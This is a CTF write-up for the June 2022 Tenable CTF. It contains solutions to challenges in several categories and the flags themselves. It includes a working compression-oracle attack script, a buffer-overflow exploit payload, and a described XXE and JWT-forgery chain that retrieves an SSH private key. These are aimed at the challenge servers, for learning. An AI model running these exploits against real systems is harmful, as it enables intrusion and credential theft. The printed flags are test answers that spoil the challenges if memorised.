<p align="center"> ### Tenable CTF, June 2022 documentation ### </p>
<p align="center"> ### Placement: 78 / 1357 ### </p>
<br/><br/>


- [FORENSICS](#forensics)
- [CRYPTO](#crypto)
- [TENABLE](#tenable)
- [WEB](#web)
- [OSINT](#osint)
- [RE](#re)
- [STEGANOGRAPHY](#steganography)
- [MISC](#misc)


<br/><br/>

## FORENSICS
### The One with a Lot of Cats
This one was a .img file, that refused to mount. 7zip opened it though, revealing a sickening collection of cat pictures. There was also a lost+found folder, and what a journal file in a [SYS] folder. Opening this journal file in a hex editor, the contents were mostly seemingly garbage, but there were references to the images, as well as one reference to an image in the lost+found folder. In reality, the image was not there though.

Figured I would open this in a recovery utility instead, which revealed the deleted image and the flag inside. Others used Autopsy to just immediately find the image. `flag{m30w}`.

### Strange Packets (100p, Zenode)
...

### Top Secret (100p)
Babby tier.

## CRYPTO
### Wifi Password of The Day (200p, Fel)
This was my favorite challenge of the CTF by far. We are provided with a python script named `wifi.py` which spins up a TCP server. Connecting to it, we are asked to provide a username, which is added to a JSON object which is then compressed using zlib and encrypted using AES-CBC. This compressed string is then returned to the user.

![](https://i.imgur.com/kF5ybAx.png)

Compressing the JSON makes this encryption vulnerable to a compression oracle attack. We can guess the flag byte by byte, as the flag is already in the data that is being compressed if our guess is correct then the compression algorithm will remove this redundant data and we will not see an increase in length, otherwise the length will increase.

I wouldn't have been able to complete this challenge without the help of a brilliant writeup by [f0rki](https://hack.more.systems/writeup/2015/10/06/tumctfteaser2015-turbo/). I used basically a slightly modified version of the code in the writeup linked to acquire the flag.

```python
from pwn import *
import json
import collections
import struct
import string
import random

#https://hack.more.systems/writeup/2015/10/06/tumctfteaser2015-turbo/

context.log_level = "WARNING"

iv = 16 * b'\x00'

first = b'{"user": "000000' #first 16 bytes (with 0*6)
second = b'0'*16 #xd

candidates = 'abcdefghijklmnopqrstuvwxyz_'

def main(input):
	r = remote('0.cloud.chals.io',28931)
	#r = remote('localhost', 1234)


	r.sendlineafter(b'\n',input)

	out = r.recvline(timeout=5)

	ct = out[16:-2]

	return base64.b64decode(ct).hex()

printables = string.digits + "_" + string.ascii_letters + '@#-[]+='
printables = printables[::-1]
printables = ''.join(random.sample(printables, len(printables)))


flaglen = 32
minlen = len(main(''))
pl = minlen
padlen = 0

for i in range(21,50):
	log.warning("trying {} chars".format(i))
	l = len(main(printables[:i]))
	log.warning("got length {}".format(l))
	if l != pl:
		padlen = i + 1
		break
log.warning("deduced padding length {}".format(padlen))


BB = padlen - 4
previous = []
pl = 0
for i in range(len(previous), flaglen):
	log.warning("guessing char number {}".format(i))
	test = "flag{" + "".join(previous)
	test = printables[:BB] + test 
	log.warning("tryhing prefix: " + test)
	pl = len(main(test))
	log.warning("got length = {}".format(pl))
	foundit = False
	for c in printables + "}":
		test = "flag{"+ "".join(previous)
		test = printables[:BB] + test + c
		log.warning("trying prefix: " + test)
		l = len(main(test))
		log.warning("l = {}, pl = {}".format(l,pl))
		if l == pl:
			log.warning("deduced next char: " + c)
			previous.append(c)
			foundit = True
			break
		else:
			log.warning("guess was wrong")
	if foundit:
		log.warning("Current flag prefix guess is \'flag{}{}\'"
		.format("{", "".join(previous)))
	else:
		log.error("couldn't guess char {}".format(i))
	if previous[-1] == "}":
		break

flag = "flag{" + "".join(previous)
if flag[-1] != "}":
	flag += "}"
log.warning("final flag should be "+ flag)
```

After running this (for a very long time) we get our flag! `flag{c0mpr3ssion_0r4cl3_FTW}`

![](https://i.imgur.com/xZ0IQiG.png)
### Hackerized
Babby tier.

## TENABLE
### A Cube and a Palindrome (100p)
This was a compiled .NASL script that asked for a timestamp as an input. It would then respond with either "too early" or "too late". Additionally, the "on time" desired timestamp was constantly shifting forward (either locally as the script was run or through a network connection). 

A binary search would have worked too, but I was just messing around with it, put in a timestamp about 30 seconds before the desired timestamp, and then spammed that command roughly 10 times waiting for the script to shift towards me. `flag{numbers_are_neat}`. 

### False Flags (100p)
A Tenable challenge to be solved with their Nessus vulnerability analysis software. Challenge included a scan.db file. Exported the scan results for the main host, found the flag `flag{H5dY_pysR_4J3c_H3XA}`. To further decipher that, downloaded the .kb file of the scan, which is effectively a log of all the actions taken and plugins used for the scan. There was a cipher at the bottom of this file, which revealed the real flag when applied backwards, so not A = e but e = A. `flag{tru3_fl4g_7h15_t1me}`.

### What's in a Name?
Second Tenable challenge, using the same scan.db file. In addition to the main host mentioned above, the scan also included roughly 30 other hosts. The only information revealed about them was a hostname discovery scan. The fourth octet of the IP of every host, decoded from decimal to ascii, yielded the flag. `flag{th4t__which_w3_c4ll_a_h0st}`.

### Fun with NASL
So we were given another .NASL script. The script had 4 errors in it, and the task was to fix those errors, and then pass those line numbers of the fixed errors to the script.

The first error, was due to a missing semicolon, making the script not run at all. Line 20.

The second error was "defining global variable", which was just an obvious typo in a variable name. Line 33.

The third error was "function d() has no argument a". This was a bit confusing, as the script was heavily obfuscated and there were multiple places where function d was called. Eventually though I did find the line, where function d called a:ret. Removing the a: part solved the issue. Line 71.

The fourth error was "add : bad types 31:3 for instruction". The line was "ab = 40 + [3]", changing it to ab = 43 seemed to work. Line 5.

Finally, we had to supply the correct variable (or "preference", as it was called) that the script was expecting. This was "line_numbers", and the values had to be entered comma separated. So, `nasl -W -P 'line_numbers=20,33,71,5'` printed out `flag{N4SL_is_n34t}`.

## WEB
### Babby Web 1-4 (100p each, Fel)
Challs 1-4 were all on the same site and located in the following places:
- The SSL Certificate
- The HTML in plaintext
- The headers
- robots.txt

### ContinuuOS (100p, Fel)
Fairly simple, used a XML External Entity injection to retrieve `file:///var/www/html/conf.xml`. This tells me that password is `Continu321!`, as well as something mysteriously named `secret`.

![xxe](https://i.imgur.com/6SRCKUZ.png) 

After logging on we see a page that allows us to retrieve `/var/log/operations.log` and display the contents, surely we can use this to acquire the flag.
![webpage](https://i.imgur.com/5gv0L07.png)

Using ZAP I can see that pressing submit sends a JWT token, decoding it shows that I can change the file retrieved to anything. The challenge description mentions something about ssh, so I change the payload to retrieve `/home/operations/.ssh/id_rsa`, encoding it using the secret from before, and receive the flag.

![flagos](https://i.imgur.com/S61CHLa.png)
## OSINT
### Find Me if You Can (100p, Charlie)
...

### Lets Network (100p, Charlie)
...

### Can You Dig it? (100p, Charlie)
...

## RE
### Olden Ring (100p, Fel)
Upon running the script we are presented with a prompt asking for a name, upon providing a name it responds with some flavor text and asks us to input a number between `[0,250]`.

![](https://i.imgur.com/hYYH8Pm.png)

After playing around for a bit I noticed that the program produces a SEGFAULT error when provided a number larger than ~195. After disassembling the binary I found a function named `zip_to_end()` which returned the flag when called. To get the flag, I wrote a *very* short script to send a payload to cause a buffer overflow and return the flag.

```python
from pwn import *	

r = remote('0.cloud.chals.io', 19267)
r.recvline()

r.send('A'*1006 + '\xb6\x12\x40\x00\x00\x00\x00\x00\n')
r.recvuntil(' ', drop=True)
r.recvline()
r.interactive()
```

Running this, we get the flag `flag{w3ll_pwn3d_t4rn1sh3d}`

![](https://i.imgur.com/5AhxfVu.png)

## STEGANOGRAPHY
### Characters of Shakespeare's Plays (200p, Charlie)
...

## MISC
### Poor Murphy (100p)
Challenge gave us a scrambled image, effectively something like a jigsaw puzzle, with each segment being 100x100px. There's probably some sort of a programmatic way of solving this, but I wasn't sure how to do that so I proceeded manually. 

I removed all the background segments, and then removed every other segment that didn't have a part of a letter in it. I missed a couple but it was good enough. Then I just put them together. It wasn't too easy, but the gradient lines behind the letters helped to align things. `flag{we_have_the_technology}`.

![Photoshop_dCTEvMFvwe](https://user-images.githubusercontent.com/8545997/173461298-a590eff5-a6c0-4991-ba70-2bc32cf52e51.png)













